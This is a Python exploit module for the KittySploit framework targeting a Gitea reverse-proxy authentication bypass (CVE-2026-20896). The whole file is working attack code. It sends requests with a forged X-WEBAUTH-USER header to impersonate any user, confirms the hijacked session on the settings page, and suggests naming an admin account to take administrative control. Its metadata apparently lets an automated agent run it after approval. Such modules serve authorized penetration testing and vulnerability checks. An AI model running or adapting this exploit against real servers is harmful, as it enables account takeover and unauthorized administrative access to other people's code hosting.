#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import random
import re
from typing import List, Optional, Tuple

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.scanner.http.response_validation import parse_json_response

_AFFECTED_VERSION = "1.26.2"
_SETTINGS_PAGE = "/user/settings"
_WEBAUTH_HEADER = "X-WEBAUTH-USER"


class Module(Auxiliary, Http_client):
    __info__ = {
        "name": "Gitea CVE-2026-20896 - X-WEBAUTH-USER reverse-proxy auth bypass",
        "description": (
            "CVE-2026-20896: default Gitea Docker deployments (<= 1.26.2) ship with "
            "REVERSE_PROXY_TRUSTED_PROXIES = * and accept X-WEBAUTH-USER from any source. "
            "An attacker can impersonate any user (including admins) on the web UI without "
            "a password or API token."
        ),
        "author": ["KittySploit Team"],
        "cve": ["CVE-2026-20896"],
        "references": [
            "https://www.cve.org/CVERecord?id=CVE-2026-20896",
        ],
        "tags": [
            "gitea",
            "git",
            "devops",
            "auth-bypass",
            "reverse-proxy",
            "header-injection",
            "cve-2026-20896",
            "auxiliary",
        ],
        "agent": {
            "risk": "intrusive",
            "effects": ["active_exploitation"],
            "expected_requests": 4,
            "reversible": False,
            "approval_required": True,
            "produces": ["exploit_paths", "risk_signals"],
            "cost": 1.0,
            "noise": 0.3,
            "value": 1.0,
            "requires": {
                "min_endpoints": 0,
                "min_params": 0,
                "tech_hints_any": ["gitea", "git", "devops"],
                "tech_hints_all": [],
                "specializations_any": [],
                "risk_signals_any": [],
                "auth_session": False,
                "capabilities_any": [],
                "capabilities_all": [],
                "confidence_min": {},
                "confidence_min_any": {},
                "endpoint_pattern_any": ["/user/login", "/api/v1/version"],
                "param_any": [],
                "api_surface_ready": False,
            },
            "chain": {
                "produces_capabilities": [
                    {"capability": "auth_bypass", "from_detail": "webauth_user"},
                    {"capability": "web_session", "from_detail": ""},
                ],
                "consumes_capabilities": [],
                "option_bindings": {},
                "suggested_followups": [],
            },
        },
    }

    port = OptPort(3000, "Gitea HTTP port", True)
    ssl = OptBool(False, "Use HTTPS", True, advanced=True)
    base_path = OptString("/", "Base URI path if Gitea is not at site root", required=False)
    username = OptString(
        "",
        "Username to impersonate (random probe user if empty)",
        required=False,
    )
    settings_path = OptString(
        _SETTINGS_PAGE,
        "Protected page used to confirm authenticated session",
        required=False,
    )
    verbose = OptBool(False, "Print HTTP status details for each probe step", required=False, advanced=True)

    @staticmethod
    def _version_tuple(version: str) -> Tuple[int, ...]:
        parts: List[int] = []
        for token in re.split(r"[.\-+]", str(version or "")):
            digits = "".join(ch for ch in token if ch.isdigit())
            if digits:
                parts.append(int(digits))
        while len(parts) < 3:
            parts.append(0)
        return tuple(parts[:4])

    @classmethod
    def _version_lte(cls, version: str, limit: str) -> bool:
        if not version or not limit:
            return False
        return cls._version_tuple(version) <= cls._version_tuple(limit)

    def _opt(self, option) -> str:
        if hasattr(option, "value"):
            return str(option.value or "").strip()
        return str(option or "").strip()

    def _join_path(self, path: str) -> str:
        base = self._opt(self.base_path) or "/"
        base = base.rstrip("/")
        if not path.startswith("/"):
            path = "/" + path
        if base in ("", "/"):
            return path
        return base + path

    def _request_timeout(self) -> int:
        return max(int(self.timeout or 10), 10)

    def _probe_username(self) -> str:
        chosen = self._opt(self.username)
        if chosen:
            return chosen
        return "pocvictim%d" % random.randint(1000, 9999)

    def _get_page(self, path: str, webauth_user: Optional[str] = None):
        headers = {}
        if webauth_user:
            headers[_WEBAUTH_HEADER] = webauth_user
        return self.http_request(
            method="GET",
            path=path,
            headers=headers,
            allow_redirects=False,
            timeout=self._request_timeout(),
        )

    def _fetch_gitea_version(self) -> str:
        response = self._get_page(self._join_path("/api/v1/version"))
        if not response:
            return ""
        data, err = parse_json_response(response)
        if err or not data:
            return ""
        return str(data.get("version") or "").strip()

    def _looks_like_login_redirect(self, response) -> bool:
        if not response:
            return False
        if response.status_code not in (301, 302, 303, 307, 308):
            return False
        location = str(response.headers.get("Location") or "").lower()
        return "login" in location or response.status_code == 303

    def _settings_confirms_login(self, response, username: str) -> bool:
        if not response or response.status_code != 200:
            return False
        body = response.text or ""
        if username not in body:
            return False
        lowered = body.lower()
        return "settings" in lowered or "profile" in lowered or 'name="' + username.lower() + '"' in lowered

    def _probe_bypass(self, username: str) -> dict:
        settings = self._join_path(self._opt(self.settings_path) or _SETTINGS_PAGE)
        profile = self._join_path("/" + username.lstrip("/"))

        unauth = self._get_page(settings)
        spoofed = self._get_page(settings, webauth_user=username)
        profile_resp = self._get_page(profile, webauth_user=username)

        unauth_code = unauth.status_code if unauth else None
        spoofed_code = spoofed.status_code if spoofed else None
        profile_code = profile_resp.status_code if profile_resp else None

        login_redirect = self._looks_like_login_redirect(unauth)
        logged_in = self._settings_confirms_login(spoofed, username)
        profile_ok = bool(profile_resp and profile_resp.status_code == 200)

        vulnerable = logged_in and (login_redirect or unauth_code in (401, 403))
        reason = ""
        if vulnerable:
            reason = (
                f"X-WEBAUTH-USER accepted for '{username}' on {settings} "
                f"(HTTP {spoofed_code})"
            )
        elif not unauth:
            reason = "Could not reach protected settings page"
        elif not login_redirect and unauth_code == 200:
            reason = "Settings page reachable without authentication (unexpected baseline)"
        elif not logged_in:
            reason = (
                f"Spoofed request to {settings} did not establish a session "
                f"(HTTP {spoofed_code})"
            )
        else:
            reason = "Reverse-proxy auth bypass not confirmed"

        return {
            "vulnerable": vulnerable,
            "reason": reason,
            "username": username,
            "settings_path": settings,
            "profile_path": profile,
            "unauth_code": unauth_code,
            "spoofed_code": spoofed_code,
            "profile_code": profile_code,
            "logged_in": logged_in,
            "profile_ok": profile_ok,
        }

    def check(self):
        version = self._fetch_gitea_version()
        if not version:
            return {
                "vulnerable": False,
                "reason": "Gitea version API not detected",
                "confidence": "low",
            }

        username = self._probe_username()
        result = self._probe_bypass(username)
        confidence = "high" if result.get("vulnerable") else "medium"

        if result.get("vulnerable"):
            if self._version_lte(version, _AFFECTED_VERSION):
                reason = (
                    f"{result['reason']}; Gitea {version} <= {_AFFECTED_VERSION}"
                )
            else:
                reason = (
                    f"{result['reason']}; version {version} may be patched but bypass still works"
                )
            return {
                "vulnerable": True,
                "reason": reason,
                "confidence": confidence,
                "version": version,
                "username": username,
            }

        detail = result.get("reason") or "Auth bypass not confirmed"
        if self._version_lte(version, _AFFECTED_VERSION):
            detail = f"{detail}; version {version} is in affected range <= {_AFFECTED_VERSION}"

        return {
            "vulnerable": False,
            "reason": detail,
            "confidence": confidence,
            "version": version,
        }

    def run(self):
        version = self._fetch_gitea_version()
        if version:
            print_info(f"Gitea version: {version}")
            if self._version_lte(version, _AFFECTED_VERSION):
                print_warning(f"Version {version} is at or below affected {_AFFECTED_VERSION}")
        else:
            print_warning("Could not read /api/v1/version; continuing with web-session probe")

        username = self._probe_username()
        print_status(f"Impersonation target: {username}")
        result = self._probe_bypass(username)

        settings = result.get("settings_path")
        profile = result.get("profile_path")

        print_status(f"1) {settings} without {_WEBAUTH_HEADER} -> HTTP {result.get('unauth_code')}")
        if result.get("unauth_code") in (301, 302, 303, 307, 308):
            print_info("Redirect to login indicates unauthenticated access (expected baseline)")

        print_status(f"2) {settings} with {_WEBAUTH_HEADER}: {username} -> HTTP {result.get('spoofed_code')}")
        if result.get("logged_in"):
            print_success(
                f"Logged in as '{username}' without password or token from any source IP"
            )
        else:
            print_error("Spoofed header did not establish an authenticated session")
            print_error(result.get("reason") or "Auth bypass failed")
            return False

        print_status(f"3) {profile} profile page -> HTTP {result.get('profile_code')}")
        if result.get("profile_ok"):
            print_success("User profile reachable (account may have been auto-provisioned)")

        if bool(self.verbose):
            print_info(
                f"Replay: GET {settings} with header {_WEBAUTH_HEADER}: <username>"
            )

        print_info(
            "Default Docker images trust all proxies (REVERSE_PROXY_TRUSTED_PROXIES=*); "
            "supply an existing admin username to gain administrative web access."
        )
        return True
